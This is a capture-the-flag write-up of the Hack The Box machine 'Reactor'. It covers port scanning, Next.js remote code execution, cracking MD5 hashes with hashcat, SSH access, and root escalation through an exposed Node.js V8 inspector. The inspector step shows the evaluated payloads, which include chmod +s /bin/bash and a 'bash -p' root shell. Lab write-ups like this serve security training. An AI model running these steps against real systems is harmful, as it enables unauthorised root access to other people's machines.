# Reactor - Hack The Box Writeup

## Reconnaissance

We begin by scanning the target machine (`10.129.55.228`) with `nmap` to discover open ports. 

![[Pasted image 20260723143828.png]]

```bash
sudo nmap -sS -T5 -p- -Pn 10.129.55.228 -vvv
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-23 14:37 +0200
Initiating Parallel DNS resolution of 1 host. at 14:37
Completed Parallel DNS resolution of 1 host. at 14:37, 0.50s elapsed
DNS resolution of 1 IPs took 0.50s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 14:37
Scanning 10.129.55.228 [65535 ports]
Discovered open port 22/tcp on 10.129.55.228
Warning: 10.129.55.228 giving up on port because retransmission cap hit (2).
channel 5: open failed: connect failed: Connection refused
channel 5: open failed: connect failed: Connection refused
channel 5: open failed: connect failed: Connection refused
Discovered open port 3000/tcp on 10.129.55.228
channel 5: open failed: connect failed: Connection refused
Completed SYN Stealth Scan at 14:38, 36.97s elapsed (65535 total ports)
Nmap scan report for 10.129.55.228
Host is up, received user-set (0.041s latency).
Scanned at 2026-07-23 14:37:49 CEST for 37s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
3000/tcp open  ppp     syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 37.53 seconds
           Raw packets sent: 67467 (2.969MB) | Rcvd: 66669 (2.667MB)
```

We follow up with a detailed service and script scan on ports 22 and 3000:

```bash
┌──(julicc㉿arceus)-[~]
└─$ sudo nmap -sC -sV -p22,3000 10.129.55.228
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-23 14:40 +0200
Nmap scan report for 10.129.55.228
Host is up (0.048s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 ce:fd:0d:82:c0:23:ed:6e:4b:ea:13:fa:4f:ea:ef:b7 (ECDSA)
|_  256 f8:44:c6:46:58:7a:39:21:ef:16:44:e9:58:c2:f3:62 (ED25519)
3000/tcp open  ppp?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
|     x-nextjs-cache: HIT
|     x-nextjs-prerender: 1
|     x-nextjs-stale-time: 4294967294
|     X-Powered-By: Next.js
|     Cache-Control: s-maxage=31536000,
|     ETag: "p02u6gnhufd8t"
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 17175
|     Date: Thu, 23 Jul 2026 12:40:52 GMT
|     Connection: close
|     <!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/414e1be982bc8557.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-db0a529a99835594.js"/><script src="/_next/static/chunks/4bd1b696-80bcaf75e1b4285e.js" async=""></script><script src="/_next/static/chunks/517-d083b552e04dead1.js" async=""></script><script s
|   HTTPOptions, RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
|     Allow: GET
|     Allow: HEAD
|     Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
|     Date: Thu, 23 Jul 2026 12:40:53 GMT
|     Connection: close
|   Help, NCP, RPCCheck:
|     HTTP/1.1 400 Bad Request
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.99%I=7%D=7/23%Time=6A620BD4%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,34BC,"HTTP/1\.1\x20200\x20OK\r\nVary:\x20RSC,\x20Next-Router-S
SF:tate-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Prefetch,\x2
SF:0Accept-Encoding\r\nx-nextjs-cache:\x20HIT\r\nx-nextjs-prerender:\x201\
SF:r\nx-nextjs-stale-time:\x204294967294\r\nX-Powered-By:\x20Next\.js\r\nC
SF:ache-Control:\x20s-maxage=31536000,\x20\r\nETag:\x20\"p02u6gnhufd8t\"\r
SF:\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2017
SF:175\r\nDate:\x20Thu,\x2023\x20Jul\x202026\x2012:40:52\x20GMT\r\nConnect
SF:ion:\x20close\r\n\r\n<!DOCTYPE\x20html><html\x20lang=\"en\"><head><meta
SF:\x20charSet=\"utf-8\"/><meta\x20name=\"viewport\"\x20content=\"width=de
SF:vice-width,\x20initial-scale=1\"/><link\x20rel=\"stylesheet\"\x20href=\
SF:"/_next/static/css/414e1be982bc8557\.css\"\x20data-precedence=\"next\"/
SF:><link\x20rel=\"preload\"\x20as=\"script\"\x20fetchPriority=\"low\"\x20
SF:href=\"/_next/static/chunks/webpack-db0a529a99835594\.js\"/><script\x20
SF:src=\"/_next/static/chunks/4bd1b696-80bcaf75e1b4285e\.js\"\x20async=\"\
SF:"></script><script\x20src=\"/_next/static/chunks/517-d083b552e04dead1\.
SF:js\"\x20async=\"\"></script><script\x20s")%r(Help,2F,"HTTP/1\.1\x20400\
SF:x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(NCP,2F,"HTTP/1\.1
SF:\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(HTTPOptio
SF:ns,10C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nvary:\x20RSC,\x20Next-Rou
SF:ter-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Prefetc
SF:h\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nCache-Control:\x20private,\x20n
SF:o-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r\nDate:\x20Thu,
SF:\x2023\x20Jul\x202026\x2012:40:53\x20GMT\r\nConnection:\x20close\r\n\r\
SF:n")%r(RTSPRequest,10C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nvary:\x20R
SF:SC,\x20Next-Router-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-
SF:Segment-Prefetch\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nCache-Control:\x
SF:20private,\x20no-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r
SF:\nDate:\x20Thu,\x2023\x20Jul\x202026\x2012:40:53\x20GMT\r\nConnection:\
SF:x20close\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.67 seconds
```

The scan identifies an SSH service running on port 22 and an HTTP service powered by Next.js on port 3000.

## Foothold / Initial Access

Visiting the web application on port 3000, we observe a Next.js interface:

![[Pasted image 20260723144306.png]]
![[Pasted image 20260723144359.png]]

Researching the framework version (Next.js 15.0.3) reveals it is vulnerable to **react2shell**, which allows us to achieve remote code execution (RCE) and extract system hashes.

![[Pasted image 20260724154600.png]]

After leveraging this exploit, we dump MD5 password hashes and crack them using `hashcat` with the `rockyou.txt` wordlist:

```bash
┌──(julicc㉿arceus)-[~/react2shell-poc]
└─$ hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-skylake-avx512-AMD Ryzen 9 7945HX with Radeon Graphics, 6971/13943 MB (2048 MB allocatable), 16MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 2 digests; 2 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory allocated for this attack: 516 MB (14952 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

39d97110eafe2a9a68639812cd271e8e:reactor1
Approaching final keyspace - workload adjusted.


Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 0 (MD5)
Hash.Target......: hashes.txt
Time.Started.....: Fri Jul 24 15:41:57 2026 (1 sec)
Time.Estimated...: Fri Jul 24 15:41:58 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........: 12285.8 kH/s (0.18ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
Recovered........: 1/2 (50.00%) Digests (total), 1/2 (50.00%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: #!hottie -> $HEX[042a0337c2a156616d6f732103]

Started: Fri Jul 24 15:41:55 2026
Stopped: Fri Jul 24 15:41:59 2026
```

The hash cracks successfully, yielding the password `reactor1`. We then log in over SSH as the `engineer` user and retrieve the user flag:

```bash
┌──(julicc㉿arceus)-[~]
└─$ ssh engineer@reactor.htb
engineer@reactor.htb's password:
 ____  _____    _    ____ _____ ___  ____
|  _ \| ____|  / \  / ___|_   _/ _ \|  _ \
| |_) |  _|   / _ \| |     | || | | | |_) |
|  _ <| |___ / ___ \ |___  | || |_| |  _ <
|_| \_\_____/_/   \_\____| |_| \___/|_| \_\

    ReactorWatch Core Monitoring System
    Nuclear Dynamics Corp. - Site 7

    AUTHORIZED PERSONNEL ONLY
Last login: Fri Jul 24 13:47:03 2026 from 10.10.15.20
engineer@reactor:~$ ls
user.txt
engineer@reactor:~$ cat user.txt
789b826527cb650c99b530b38d7e1675
```

## Privilege Escalation

To identify vectors for privilege escalation, we execute `linpeas.sh` on the system. Looking through the output, we spot a suspicious `node` process running as `root` with the V8 inspector enabled:

```shell
════════════════════════════════════╣ Processes, Cron, Services, Timers & Sockets ╠════════════════════════════════════
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
...
root        1391  0.0  1.1 1065756 45292 ?       Ssl  13:28   0:00 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
...
```

![[Pasted image 20260724163317.png]]

The parameter `--inspect=127.0.0.1:9229` opens a debugging port that allows executing arbitrary JavaScript within the Node.js context. Because the process is running as root, any code we run through the inspector also executes as root. 

We utilize a custom exploit script (`node_inspector_lpe.py`) to connect to the inspector's WebSocket. First, we confirm our access by executing the `id` command:

```shell
engineer@reactor:~$ python3 node_inspector_lpe.py --payload id

    _   __          __        ____                           __
   / | / /___  ____/ /__     /  _/___  _________  ___  _____/ /_____  _____
  /  |/ / __ \/ __  / _ \    / // __ \/ ___/ __ \/ _ \/ ___/ __/ __ \/ ___/
 / /|  / /_/ / /_/ /  __/  _/ // / / (__  ) /_/ /  __/ /__/ /_/ /_/ / /
/_/ |_/\____/\__,_/\___/  /___/_/ /_/____/ .___/\___/\___/\__/\____/_/
                                         /_/
              Local Privilege Escalation via V8 Inspector

[*] Querying inspector at 127.0.0.1:9229 ...
[*] Target: /opt/uptime-monitor/worker.js
[*] WebSocket URL: ws://127.0.0.1:9229/3bb144ac-a213-4825-89d6-5dbbccf6333d
[*] Connecting to WebSocket ...
[+] Connected!
[*] Payload: Run `id` to confirm root execution
[*] Evaluating: require('child_process').execSync('id').toString()

[+] Result:

uid=0(root) gid=0(root) groups=0(root)


[*] Done.
```

Next, we run the script with the `suid` payload. This runs `chmod +s /bin/bash`, setting the SUID bit on the bash executable and allowing us to drop into a root shell:

```shell
engineer@reactor:~$ python3 node_inspector_lpe.py --payload suid

    _   __          __        ____                           __
   / | / /___  ____/ /__     /  _/___  _________  ___  _____/ /_____  _____
  /  |/ / __ \/ __  / _ \    / // __ \/ ___/ __ \/ _ \/ ___/ __/ __ \/ ___/
 / /|  / /_/ / /_/ /  __/  _/ // / / (__  ) /_/ /  __/ /__/ /_/ /_/ / /
/_/ |_/\____/\__,_/\___/  /___/_/ /_/____/ .___/\___/\___/\__/\____/_/
                                         /_/
              Local Privilege Escalation via V8 Inspector

[*] Querying inspector at 127.0.0.1:9229 ...
[*] Target: /opt/uptime-monitor/worker.js
[*] WebSocket URL: ws://127.0.0.1:9229/3bb144ac-a213-4825-89d6-5dbbccf6333d
[*] Connecting to WebSocket ...
[+] Connected!
[*] Payload: Set SUID bit on /bin/bash (then run: bash -p)
[*] Evaluating: require('child_process').execSync('chmod +s /bin/bash').toString()

[+] Result:



[*] SUID bit set. Now run:
      bash -p
    You should drop to a root shell.

[*] Done.
```

We execute `bash -p` to claim our privileged shell and capture the root flag:

```shell
engineer@reactor:~$ bash -p
bash-5.2# ls
linpeas.sh  node_inspector_lpe.py  user.txt
bash-5.2# ls /root
root.txt
bash-5.2# cat /root/root.txt
6d265fa28b1a9f5fc14801c514214ee6
bash-5.2#
```

## Conclusion

Reactor highlights the dangers of using outdated or vulnerable web frameworks (Next.js react2shell) and underscores the importance of securing local development and administrative tools. Exposing the Node.js V8 inspector on a root process created a straightforward path for privilege escalation, demonstrating why debugging interfaces should never be left active or unauthenticated in production environments.
